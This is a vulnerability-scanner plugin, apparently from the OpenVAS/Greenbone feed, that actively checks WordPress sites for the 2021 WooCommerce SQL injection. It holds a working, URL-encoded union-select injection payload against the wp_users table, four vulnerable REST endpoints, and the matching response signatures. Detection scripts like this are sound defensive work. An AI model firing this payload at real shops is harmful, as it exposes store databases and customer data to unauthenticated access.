# Copyright (C) 2021 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.117571");
  script_version("2021-07-20T13:46:16+0000");
  script_tag(name:"last_modification", value:"2021-07-21 10:16:50 +0000 (Wed, 21 Jul 2021)");
  script_tag(name:"creation_date", value:"2021-07-20 08:18:25 +0000 (Tue, 20 Jul 2021)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_tag(name:"qod_type", value:"remote_banner");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("WordPress WooCommerce Plugin SQL Injection Vulnerability (Jul 2021) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2021 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/installed");

  script_tag(name:"summary", value:"The WooCommerce plugin for WordPress is prone to an SQL
  injection vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The vulnerability allows unauthenticated attackers to access
  arbitrary data in an online store's database.");

  script_tag(name:"affected", value:"The vulnerability affects versions 3.3 to 5.5.");

  script_tag(name:"solution", value:"Updates are available. Please see the referenced advisory
  for more information.");

  script_xref(name:"URL", value:"https://woocommerce.com/posts/critical-vulnerability-detected-july-2021/#");
  script_xref(name:"URL", value:"https://www.wordfence.com/blog/2021/07/critical-sql-injection-vulnerability-patched-in-woocommerce/");
  script_xref(name:"URL", value:"https://viblo.asia/p/phan-tich-loi-unauthen-sql-injection-woocommerce-naQZRQyQKvx");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

# ") union all select 1,concat(id,0x3a,CHAR(115,113,108,105,45,116,101,115,116))from wp_users where ID IN (1);
# CHAR(115,113,108,105,45,116,101,115,116) -> sqli-test
attack_pattern = "%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252cCHAR%252528115%25252c113%25252c108%25252c105%25252c45%25252c116%25252c101%25252c115%25252c116%252529%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500";

urls = make_list(
  # "Pretty" links
  dir + "/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern,
  dir + "/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern,
  # Non "Pretty" links
  dir + "/index.php/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern,
  dir + "/index.php?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=" + attack_pattern );

foreach url( urls ) {

  req = http_get( port:port, item:url );
  res = http_keepalive_send_recv( port:port, data:req );
  if( ! res || res !~ "^HTTP/1\.[01] 200" )
    continue;

  headers = http_extract_headers_from_response( data:res );
  body = http_extract_body_from_response( data:res );
  if( ! body || ! headers || headers !~ "Content-Type\s*:\s*application/json" )
    continue;

  # Vulnerable systems are responding with something like e.g.:
  # {"price_range":null,"attribute_counts":[{"term":0,"count":0},{"term":"1:sqli-test","count":1}],"rating_counts":null}
  #
  # Patched systems (tested with 5.5.1 and 4.8.1) are responding with:
  # {"price_range":null,"attribute_counts":[],"rating_counts":null}
  if( '"term":"1:sqli-test"' >< body ) {
    report = 'It was possible to conduct an SQL injection attack via the following URL:\n\n';
    report += http_report_vuln_url( port:port, url:url, url_only:TRUE ) + '\n\n';
    report += 'Proof (The "sqli-test" string got created via an injected "CHAR()" SQL function):
';
    report += body;
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 0 ); # At least 3.4.8 seems to require different end-point not covered above yet.